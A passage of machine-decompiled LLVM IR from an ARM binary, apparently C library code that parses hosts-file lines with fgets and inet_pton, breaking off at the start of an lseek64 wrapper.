  %v3_19d88 = load i32, i32* %v2_19d88, align 4
  %v1_19d8c = load i32, i32* @sb, align 4
  %v2_19d8c = inttoptr i32 %v1_19d8c to i32*
  store i32 %v3_19d88, i32* %v2_19d8c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_19da0 = load i32, i32* @r4, align 4
  %v1_19da0 = add i32 %v0_19da0, 8
  store i32 %v1_19da0, i32* %r1.global-to-local, align 4
  %v1_19da4 = load i32, i32* @sb, align 4
  %v2_19da4 = add i32 %v1_19da4, 8
  %v3_19da4 = inttoptr i32 %v2_19da4 to i32*
  store i32 2, i32* %v3_19da4, align 4
  %v0_19da8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19da8, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_19db0 = load i32, i32* @sb, align 4
  %v1_19db0 = load i32, i32* %ip.global-to-local, align 4
  %v2_19db0 = inttoptr i32 %v1_19db0 to i32*
  store i32 %v0_19db0, i32* %v2_19db0, align 4
  %v0_19db4 = load i32, i32* @r7, align 4
  %v1_19db4 = load i32, i32* %r0.global-to-local, align 4
  %v2_19db4 = inttoptr i32 %v1_19db4 to i32*
  store i32 %v0_19db4, i32* %v2_19db4, align 4
  %v0_19db8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19db8 = load i32, i32* @sb, align 4
  %v2_19db8 = add i32 %v1_19db8, 12
  %v3_19db8 = inttoptr i32 %v2_19db8 to i32*
  store i32 %v0_19db8, i32* %v3_19db8, align 4
  %v0_19dbc = load i32, i32* %r0.global-to-local, align 4
  %v1_19dbc = load i32, i32* @sb, align 4
  %v2_19dbc = add i32 %v1_19dbc, 16
  %v3_19dbc = inttoptr i32 %v2_19dbc to i32*
  store i32 %v0_19dbc, i32* %v3_19dbc, align 4
  %v0_19dc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_19dc0 = load i32, i32* @sb, align 4
  %v2_19dc0 = add i32 %v1_19dc0, 4
  %v3_19dc0 = inttoptr i32 %v2_19dc0 to i32*
  store i32 %v0_19dc0, i32* %v3_19dc0, align 4
  %v0_19dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_19dc4 = load i32, i32* %r0.global-to-local, align 4
  %v2_19dc4 = add i32 %v1_19dc4, 4
  %v3_19dc4 = inttoptr i32 %v2_19dc4 to i32*
  store i32 %v0_19dc4, i32* %v3_19dc4, align 4
  br label %dec_label_pc_19f94

dec_label_pc_19dcc:                               ; preds = %dec_label_pc_19f60
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_19dd0 = load i32, i32* @r4, align 4
  %v1_19dd0 = add i32 %v0_19dd0, 4
  %v2_19dd0 = inttoptr i32 %v1_19dd0 to i32*
  %v3_19dd0 = load i32, i32* %v2_19dd0, align 4
  store i32 %v3_19dd0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_19dd8 = load i32, i32* @sb, align 4
  %v2_19dd8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_19dd8, i32* %v2_19dd8, align 4
  store i32 %v0_19e30, i32* %ip.global-to-local, align 4
  %v0_19de0 = load i32, i32* %r3.global-to-local, align 4
  %v1_19de0 = load i32, i32* @sb, align 4
  %v2_19de0 = inttoptr i32 %v1_19de0 to i32*
  store i32 %v0_19de0, i32* %v2_19de0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19dec = load i32, i32* %ip.global-to-local, align 4
  %v1_19dec = load i32, i32* %r0.global-to-local, align 4
  %v2_19dec = inttoptr i32 %v1_19dec to i32*
  store i32 %v0_19dec, i32* %v2_19dec, align 4
  %v0_19df0 = load i32, i32* %r3.global-to-local, align 4
  %v1_19df0 = load i32, i32* @sb, align 4
  %v2_19df0 = add i32 %v1_19df0, 12
  %v3_19df0 = inttoptr i32 %v2_19df0 to i32*
  store i32 %v0_19df0, i32* %v3_19df0, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_19dfc = load i32, i32* @r4, align 4
  %v1_19dfc = add i32 %v0_19dfc, 8
  store i32 %v1_19dfc, i32* %r1.global-to-local, align 4
  %v0_19e00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19e00, i32* @sl, align 4
  %v1_19e04 = load i32, i32* @sb, align 4
  %v2_19e04 = add i32 %v1_19e04, 8
  %v3_19e04 = inttoptr i32 %v2_19e04 to i32*
  store i32 10, i32* %v3_19e04, align 4
  %v0_19e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_19e08 = load i32, i32* @sb, align 4
  %v2_19e08 = add i32 %v1_19e08, 16
  %v3_19e08 = inttoptr i32 %v2_19e08 to i32*
  store i32 %v0_19e08, i32* %v3_19e08, align 4
  %v0_19e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_19e0c = load i32, i32* @sb, align 4
  %v2_19e0c = add i32 %v1_19e0c, 4
  %v3_19e0c = inttoptr i32 %v2_19e0c to i32*
  store i32 %v0_19e0c, i32* %v3_19e0c, align 4
  %v0_19e10 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e10 = load i32, i32* %r3.global-to-local, align 4
  %v2_19e10 = add i32 %v1_19e10, 4
  %v3_19e10 = inttoptr i32 %v2_19e10 to i32*
  store i32 %v0_19e10, i32* %v3_19e10, align 4
  br label %dec_label_pc_19f94

dec_label_pc_19e18:                               ; preds = %dec_label_pc_19ce0
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_19e24

dec_label_pc_19e24:                               ; preds = %.thread, %dec_label_pc_19e18
  %v2_19e34.pre-phi = phi i32* [ %v2_19d00, %.thread ], [ %.pre, %dec_label_pc_19e18 ]
  %v0_19e30 = phi i32 [ %v1_19d5c, %.thread ], [ 0, %dec_label_pc_19e18 ]
  %stack_var_-40.1 = phi i32 [ %v1_19d68, %.thread ], [ 0, %dec_label_pc_19e18 ]
  %stack_var_-48.1 = phi i32 [ %v1_19d64, %.thread ], [ 0, %dec_label_pc_19e18 ]
  %stack_var_-52.0 = phi i32 [ %v0_19d50, %.thread ], [ %v0_19cb0, %dec_label_pc_19e18 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_19e34.pre-phi, align 4
  %v2_19ef8 = inttoptr i32 %v0_19cb4 to i8*
  %v7_19f30 = icmp eq i32 %v0_19cac, 2
  %v7_19f58 = icmp eq i32 %v0_19cac, 10
  br label %dec_label_pc_19f7c

dec_label_pc_19e3c:                               ; preds = %dec_label_pc_19f7c
  %v0_19e3c = load i32, i32* @fp, align 4
  store i32 %v0_19e3c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_19e44 = call i32 @__GI_strchr(i32 %v0_19e3c, i32 35)
  store i32 %v2_19e44, i32* %r0.global-to-local, align 4
  %v3_19e48 = icmp eq i32 %v2_19e44, 0
  br i1 %v3_19e48, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_19e3c
  %v0_19e5011 = load i32, i32* @fp, align 4
  store i32 %v0_19e5011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_19ebc.preheader

bb75:                                             ; preds = %dec_label_pc_19e3c
  %v3_19e44 = inttoptr i32 %v2_19e44 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19e50 = load i32, i32* @fp, align 4
  store i32 %v0_19e50, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_19e44, align 1
  %v0_19ebc30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ebc.preheader

dec_label_pc_19ebc.preheader:                     ; preds = %bb75, %.thread10
  %v0_19ebc30 = phi i32 [ %v0_19ebc30.pre, %bb75 ], [ %v0_19e5011, %.thread10 ]
  %v1_19ebc31 = inttoptr i32 %v0_19ebc30 to i8*
  %v2_19ebc32 = load i8, i8* %v1_19ebc31, align 1
  %v3_19ebc33 = zext i8 %v2_19ebc32 to i32
  store i32 %v3_19ebc33, i32* %r3.global-to-local, align 4
  %v2_19ec034 = icmp eq i8 %v2_19ebc32, 0
  br i1 %v2_19ec034, label %dec_label_pc_19ec8, label %dec_label_pc_19e68.preheader

dec_label_pc_19e60:                               ; preds = %dec_label_pc_19e74
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_19e64 = inttoptr i32 %v8_19e8c to i8*
  store i8 0, i8* %v3_19e64, align 1
  %v4_19e64 = load i32, i32* %r2.global-to-local, align 4
  %v5_19e64 = add i32 %v4_19e64, 1
  store i32 %v5_19e64, i32* %r2.global-to-local, align 4
  %v1_19e68 = inttoptr i32 %v5_19e64 to i8*
  %v2_19e68 = load i8, i8* %v1_19e68, align 1
  %v3_19e68 = zext i8 %v2_19e68 to i32
  store i32 %v3_19e68, i32* %r1.global-to-local, align 4
  %v2_19e6c = icmp eq i8 %v2_19e68, 0
  br i1 %v2_19e6c, label %dec_label_pc_19ec8, label %dec_label_pc_19e74

dec_label_pc_19e74:                               ; preds = %dec_label_pc_19e68.preheader, %dec_label_pc_19e60
  %v8_19e8c = phi i32 [ %v5_19e64, %dec_label_pc_19e60 ], [ %v0_19e6820, %dec_label_pc_19e68.preheader ]
  %v1_19e7c = phi i32 [ %v3_19e68, %dec_label_pc_19e60 ], [ %v3_19e6823, %dec_label_pc_19e68.preheader ]
  %v2_19e78 = load i32, i32* @global_var_29594, align 4
  store i32 %v2_19e78, i32* %r3.global-to-local, align 4
  %v3_19e7c = mul nuw nsw i32 %v1_19e7c, 2
  %v4_19e7c = add i32 %v3_19e7c, %v2_19e78
  %v5_19e7c = inttoptr i32 %v4_19e7c to i8*
  %v6_19e7c = load i8, i8* %v5_19e7c, align 1
  %v8_19e7c = zext i8 %v6_19e7c to i32
  store i32 %v8_19e7c, i32* %r3.global-to-local, align 4
  %v1_19e80 = and i32 %v8_19e7c, 32
  %v2_19e80 = icmp eq i32 %v1_19e80, 0
  br i1 %v2_19e80, label %dec_label_pc_19e88, label %dec_label_pc_19e60

dec_label_pc_19e88:                               ; preds = %dec_label_pc_19e74
  %v0_19e88 = load i32, i32* @r6, align 4
  %v7_19e8c = icmp slt i32 %v0_19e88, 7
  br i1 %v7_19e8c, label %bb76, label %dec_label_pc_19e9c.preheader

bb76:                                             ; preds = %dec_label_pc_19e88
  %v9_19e8c = load i32, i32* @r4, align 4
  %v13_19e8c = mul i32 %v0_19e88, 4
  %v14_19e8c = add i32 %v9_19e8c, %v13_19e8c
  %v15_19e8c = inttoptr i32 %v14_19e8c to i32*
  store i32 %v8_19e8c, i32* %v15_19e8c, align 4
  %v8_19e90 = load i32, i32* @r6, align 4
  %v9_19e90 = add i32 %v8_19e90, 1
  store i32 %v9_19e90, i32* @r6, align 4
  %v0_19e9c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19e9c.preheader

dec_label_pc_19e9c.preheader:                     ; preds = %bb76, %dec_label_pc_19e88
  %v0_19e9c25 = phi i32 [ %v0_19e9c25.pre, %bb76 ], [ %v8_19e8c, %dec_label_pc_19e88 ]
  %v1_19e9c26 = inttoptr i32 %v0_19e9c25 to i8*
  %v2_19e9c27 = load i8, i8* %v1_19e9c26, align 1
  %v3_19e9c28 = zext i8 %v2_19e9c27 to i32
  store i32 %v3_19e9c28, i32* %r1.global-to-local, align 4
  %v2_19ea029 = icmp eq i8 %v2_19e9c27, 0
  br i1 %v2_19ea029, label %dec_label_pc_19ebc.loopexit, label %dec_label_pc_19ea8.lr.ph

dec_label_pc_19ea8.lr.ph:                         ; preds = %dec_label_pc_19e9c.preheader
  %v2_19eac.pre = load i32, i32* @global_var_29594, align 4
  br label %dec_label_pc_19ea8

dec_label_pc_19e98:                               ; preds = %dec_label_pc_19ea8
  %v1_19e98 = add i32 %v0_19e98, 1
  store i32 %v1_19e98, i32* %r2.global-to-local, align 4
  %v1_19e9c = inttoptr i32 %v1_19e98 to i8*
  %v2_19e9c = load i8, i8* %v1_19e9c, align 1
  %v3_19e9c = zext i8 %v2_19e9c to i32
  store i32 %v3_19e9c, i32* %r1.global-to-local, align 4
  %v2_19ea0 = icmp eq i8 %v2_19e9c, 0
  br i1 %v2_19ea0, label %dec_label_pc_19ebc.loopexit, label %dec_label_pc_19ea8

dec_label_pc_19ea8:                               ; preds = %dec_label_pc_19ea8.lr.ph, %dec_label_pc_19e98
  %v0_19e98 = phi i32 [ %v0_19e9c25, %dec_label_pc_19ea8.lr.ph ], [ %v1_19e98, %dec_label_pc_19e98 ]
  %v1_19eb0 = phi i32 [ %v3_19e9c28, %dec_label_pc_19ea8.lr.ph ], [ %v3_19e9c, %dec_label_pc_19e98 ]
  store i32 %v2_19eac.pre, i32* %r3.global-to-local, align 4
  %v3_19eb0 = mul nuw nsw i32 %v1_19eb0, 2
  %v4_19eb0 = add i32 %v3_19eb0, %v2_19eac.pre
  %v5_19eb0 = inttoptr i32 %v4_19eb0 to i8*
  %v6_19eb0 = load i8, i8* %v5_19eb0, align 1
  %v8_19eb0 = zext i8 %v6_19eb0 to i32
  store i32 %v8_19eb0, i32* %r3.global-to-local, align 4
  %v1_19eb4 = and i32 %v8_19eb0, 32
  %v2_19eb4 = icmp eq i32 %v1_19eb4, 0
  br i1 %v2_19eb4, label %dec_label_pc_19e98, label %dec_label_pc_19ebc.loopexit

dec_label_pc_19ebc.loopexit:                      ; preds = %dec_label_pc_19ea8, %dec_label_pc_19e98, %dec_label_pc_19e9c.preheader
  %v0_19ebc = phi i32 [ %v0_19e9c25, %dec_label_pc_19e9c.preheader ], [ %v0_19e98, %dec_label_pc_19ea8 ], [ %v1_19e98, %dec_label_pc_19e98 ]
  %v1_19ebc = inttoptr i32 %v0_19ebc to i8*
  %v2_19ebc = load i8, i8* %v1_19ebc, align 1
  %v3_19ebc = zext i8 %v2_19ebc to i32
  store i32 %v3_19ebc, i32* %r3.global-to-local, align 4
  %v2_19ec0 = icmp eq i8 %v2_19ebc, 0
  br i1 %v2_19ec0, label %dec_label_pc_19ec8, label %dec_label_pc_19e68.preheader

dec_label_pc_19e68.preheader:                     ; preds = %dec_label_pc_19ebc.preheader, %dec_label_pc_19ebc.loopexit
  %v0_19e6820 = phi i32 [ %v0_19ebc, %dec_label_pc_19ebc.loopexit ], [ %v0_19ebc30, %dec_label_pc_19ebc.preheader ]
  %v1_19e6821 = inttoptr i32 %v0_19e6820 to i8*
  %v2_19e6822 = load i8, i8* %v1_19e6821, align 1
  %v3_19e6823 = zext i8 %v2_19e6822 to i32
  store i32 %v3_19e6823, i32* %r1.global-to-local, align 4
  %v2_19e6c24 = icmp eq i8 %v2_19e6822, 0
  br i1 %v2_19e6c24, label %dec_label_pc_19ec8, label %dec_label_pc_19e74

dec_label_pc_19ec8:                               ; preds = %dec_label_pc_19ebc.loopexit, %dec_label_pc_19e68.preheader, %dec_label_pc_19e60, %dec_label_pc_19ebc.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19ecc = load i32, i32* @r6, align 4
  %v1_19ed0 = load i32, i32* @r4, align 4
  %v5_19ed0 = mul i32 %v0_19ecc, 4
  %v6_19ed0 = add i32 %v1_19ed0, %v5_19ed0
  %v7_19ed0 = inttoptr i32 %v6_19ed0 to i32*
  store i32 0, i32* %v7_19ed0, align 4
  %v7_19ed4 = icmp sgt i32 %v0_19ecc, 1
  br i1 %v7_19ed4, label %dec_label_pc_19ed8, label %dec_label_pc_19f7c

dec_label_pc_19ed8:                               ; preds = %dec_label_pc_19ec8
  %v2_19ed8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_19ed8, i32* %r0.global-to-local, align 4
  %v7_19edc = icmp eq i32 %v2_19ed8, 1
  br i1 %v7_19edc, label %dec_label_pc_19fb0, label %dec_label_pc_19ee4

dec_label_pc_19ee4:                               ; preds = %dec_label_pc_19ed8
  %v7_19ee4 = icmp eq i32 %v2_19ed8, 2
  br i1 %v7_19ee4, label %dec_label_pc_19ef0, label %dec_label_pc_19f1c.preheader

dec_label_pc_19f1c.preheader:                     ; preds = %dec_label_pc_19ee4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19f1c

dec_label_pc_19ef0:                               ; preds = %dec_label_pc_19ee4
  store i32 %v0_19cb4, i32* %r0.global-to-local, align 4
  %v0_19ef4 = load i32, i32* @r4, align 4
  %v1_19ef4 = inttoptr i32 %v0_19ef4 to i32*
  %v2_19ef4 = load i32, i32* %v1_19ef4, align 4
  store i32 %v2_19ef4, i32* @r1, align 4
  %v3_19ef8 = call i32 @__GI_strcoll(i8* %v2_19ef8, i32 %v2_19ef4)
  store i32 %v3_19ef8, i32* %r0.global-to-local, align 4
  %v2_19efc = icmp eq i32 %v3_19ef8, 0
  br i1 %v2_19efc, label %dec_label_pc_19f2c, label %dec_label_pc_19f7c

dec_label_pc_19f08:                               ; preds = %dec_label_pc_19f1c
  %v0_19f08 = load i32, i32* @r4, align 4
  %v4_19f08 = mul i32 %v1_19f08, 4
  %v5_19f08 = add i32 %v0_19f08, %v4_19f08
  %v6_19f08 = inttoptr i32 %v5_19f08 to i32*
  %v7_19f08 = load i32, i32* %v6_19f08, align 4
  store i32 %v7_19f08, i32* %r1.global-to-local, align 4
  %v3_19f0c = call i32 @__GI_strcasecmp(i8* %v2_19ef8, i32 %v7_19f08)
  store i32 %v3_19f0c, i32* %r0.global-to-local, align 4
  %v2_19f10 = icmp eq i32 %v3_19f0c, 0
  %v0_19f14 = load i32, i32* @r5, align 4
  %v1_19f14 = add i32 %v0_19f14, 1
  store i32 %v1_19f14, i32* @r5, align 4
  br i1 %v2_19f10, label %dec_label_pc_19f2c, label %dec_label_pc_19f1c

dec_label_pc_19f1c:                               ; preds = %dec_label_pc_19f1c.preheader, %dec_label_pc_19f08
  %v1_19f08 = phi i32 [ 1, %dec_label_pc_19f1c.preheader ], [ %v1_19f14, %dec_label_pc_19f08 ]
  %v1_19f1c = load i32, i32* @r6, align 4
  store i32 %v0_19cb4, i32* %r0.global-to-local, align 4
  %v5_19f24 = icmp slt i32 %v1_19f08, %v1_19f1c
  br i1 %v5_19f24, label %dec_label_pc_19f08, label %dec_label_pc_19f7c

dec_label_pc_19f2c:                               ; preds = %dec_label_pc_19f08, %dec_label_pc_19ef0
  store i32 %v0_19cac, i32* %r1.global-to-local, align 4
  br i1 %v7_19f30, label %dec_label_pc_19f38, label %dec_label_pc_19f54

dec_label_pc_19f38:                               ; preds = %dec_label_pc_19f2c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_19f3c = load i32, i32* @r7, align 4
  store i32 %v0_19f3c, i32* %r2.global-to-local, align 4
  %v0_19f40 = load i32, i32* @r4, align 4
  %v1_19f40 = inttoptr i32 %v0_19f40 to i32*
  %v2_19f40 = load i32, i32* %v1_19f40, align 4
  store i32 %v2_19f40, i32* %r1.global-to-local, align 4
  %v3_19f44 = inttoptr i32 %v2_19f40 to i8*
  %v4_19f44 = call i32 @inet_pton(i32 2, i8* %v3_19f44, i32 %v0_19f3c)
  store i32 %v4_19f44, i32* %r0.global-to-local, align 4
  %v5_19f4c = icmp sgt i32 %v4_19f44, 0
  br i1 %v5_19f4c, label %dec_label_pc_19d88, label %dec_label_pc_19f78

dec_label_pc_19f54:                               ; preds = %dec_label_pc_19f2c
  store i32 %v0_19cac, i32* %r2.global-to-local, align 4
  br i1 %v7_19f58, label %dec_label_pc_19f60, label %dec_label_pc_19f78

dec_label_pc_19f60:                               ; preds = %dec_label_pc_19f54
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_19f64 = load i32, i32* @r4, align 4
  %v1_19f64 = inttoptr i32 %v0_19f64 to i32*
  %v2_19f64 = load i32, i32* %v1_19f64, align 4
  store i32 %v2_19f64, i32* %r1.global-to-local, align 4
  store i32 %v0_19e30, i32* %r2.global-to-local, align 4
  %v3_19f6c = inttoptr i32 %v2_19f64 to i8*
  %v4_19f6c = call i32 @inet_pton(i32 10, i8* %v3_19f6c, i32 %v0_19e30)
  store i32 %v4_19f6c, i32* %r0.global-to-local, align 4
  %v5_19f74 = icmp sgt i32 %v4_19f6c, 0
  br i1 %v5_19f74, label %dec_label_pc_19dcc, label %dec_label_pc_19f78

dec_label_pc_19f78:                               ; preds = %dec_label_pc_19f38, %dec_label_pc_19f54, %dec_label_pc_19f60
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_19f7c

dec_label_pc_19f7c:                               ; preds = %dec_label_pc_19f1c, %dec_label_pc_19ef0, %dec_label_pc_19ec8, %dec_label_pc_19f78, %dec_label_pc_19e24
  %v0_19f7c = load i32, i32* @fp, align 4
  store i32 %v0_19f7c, i32* %r0.global-to-local, align 4
  %v0_19f80 = load i32, i32* @r8, align 4
  store i32 %v0_19f80, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_19f88 = call i32 @fgets(i32 %v0_19f7c, i32 %v0_19f80, i32 %stack_var_-52.0)
  store i32 %v3_19f88, i32* %r0.global-to-local, align 4
  %v2_19f8c = icmp eq i32 %v3_19f88, 0
  br i1 %v2_19f8c, label %dec_label_pc_19f94, label %dec_label_pc_19e3c

dec_label_pc_19f94:                               ; preds = %dec_label_pc_19f7c, %dec_label_pc_19dcc, %dec_label_pc_19d88
  %v2_19f94 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_19f94, i32* %r3.global-to-local, align 4
  %v7_19f98 = icmp eq i32 %v2_19f94, 1
  br i1 %v7_19f98, label %dec_label_pc_19fb0, label %dec_label_pc_19fa0

dec_label_pc_19fa0:                               ; preds = %dec_label_pc_19f94
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_19fa4 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_19fa4 = call i32 @__GI_fclose(i8* %v1_19fa4)
  store i32 %v2_19fa4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fb0

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19cc8, %bb74, %dec_label_pc_19d1c, %dec_label_pc_19d14, %dec_label_pc_19d08, %dec_label_pc_19cf4, %dec_label_pc_19cd8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_19fb0

dec_label_pc_19fb0:                               ; preds = %dec_label_pc_19ed8, %dec_label_pc_19f94, %dec_label_pc_19fa0, %dec_label_pc_19d70, %dec_label_pc_19fac
  %v0_19fb0 = load i32, i32* @sl, align 4
  store i32 %v0_19fb0, i32* %r0.global-to-local, align 4
  store i32 %v3_19c98, i32* @r4, align 4
  store i32 %v6_19c98, i32* @r5, align 4
  store i32 %v12_19c98, i32* @r7, align 4
  store i32 %v15_19c98, i32* @r8, align 4
  store i32 %v21_19c98, i32* @sl, align 4
  store i32 %v24_19c98, i32* @fp, align 4
  ret i32 %v0_19fb0

; uselistorder directives
  uselistorder i32 %v1_19f08, { 1, 0 }
  uselistorder i32 %v0_19ecc, { 1, 0 }
  uselistorder i32 %v3_19e6823, { 1, 0 }
  uselistorder i32 %v0_19e6820, { 1, 0 }
  uselistorder i32 %v2_19e44, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_19d44, { 1, 0 }
  uselistorder i32 %v0_19d08, { 1, 0, 2, 3 }
  uselistorder i32 %v0_19cec, { 1, 0 }
  uselistorder i32 %v0_19cb8, { 1, 0, 2 }
  uselistorder i32 %v0_19cac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19ca8, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 13, 11, 14, 12, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 7, 2, 3, 0, 8, 9, 6, 1, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 17, 18, 19, 20, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 7, { 2, 14, 15, 5, 6, 7, 0, 16, 13, 1, 3, 10, 8, 9, 4, 11, 12 }
  uselistorder i32* @global_var_29594, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 3, 4, 2, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 28, 13, 27, 7, 44, 1, 45, 46, 47, 48, 12, 14, 34, 15, 35, 16, 17, 18, 0, 29, 30, 19, 26, 36, 9, 20, 31, 11, 10, 2, 32, 33, 21, 8, 23, 24, 22, 25, 37 }
  uselistorder i32 80, { 0, 1, 6, 3, 4, 5, 2 }
  uselistorder i32 48, { 17, 5, 18, 1, 0, 19, 20, 2, 11, 12, 13, 3, 6, 14, 7, 16, 15, 10, 8, 9, 4 }
  uselistorder i32 56, { 5, 6, 7, 8, 3, 9, 4, 1, 0, 2 }
  uselistorder i32 44, { 9, 10, 11, 12, 7, 8, 15, 1, 13, 14, 0, 2, 3, 4, 6, 5 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32* @fp, { 78, 81, 79, 1, 80, 82, 83, 84, 85, 0, 87, 86, 88, 89, 90, 2, 91, 92, 93, 94, 95, 96, 97, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 66, 65, 60, 61, 62, 63, 64, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 98, 99, 100 }
  uselistorder i32* @sl, { 20, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 31, 32, 33, 2, 3, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 8, 9, 10, 11, 12, 13, 14, 1, 15, 16, 17, 18, 19, 4, 5, 6, 7 }
  uselistorder i32* @r7, { 49, 51, 52, 50, 53, 54, 55, 56, 57, 58, 10, 11, 12, 13, 14, 15, 16, 1, 59, 3, 60, 61, 62, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 47, 48, 6, 30, 31, 98, 17, 18, 2, 19, 7, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 32, 33, 34, 35, 4, 5, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0, 8, 9, 96, 97, 26, 27, 28, 29, 20, 21, 22, 23, 24, 25 }
  uselistorder label %dec_label_pc_19fb0, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_19fac, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_19f7c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_19f78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19f1c, { 1, 0 }
  uselistorder label %dec_label_pc_19ec8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19e68.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19ea8, { 1, 0 }
  uselistorder label %dec_label_pc_19e24, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_19cd8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1a004, label %dec_label_pc_19ff0

dec_label_pc_19ff0:                               ; preds = %entry
  %v0_19ff0 = call i32 @__errno_location()
  %v0_19ff4 = load i32, i32* %r4.global-to-local, align 4
  %v1_19ff4 = sub i32 0, %v0_19ff4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_19ffc = inttoptr i32 %v0_19ff0 to i32*
  store i32 %v1_19ff4, i32* %v2_19ffc, align 4
  %v0_1a00c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a00c

dec_label_pc_1a004:                               ; preds = %entry
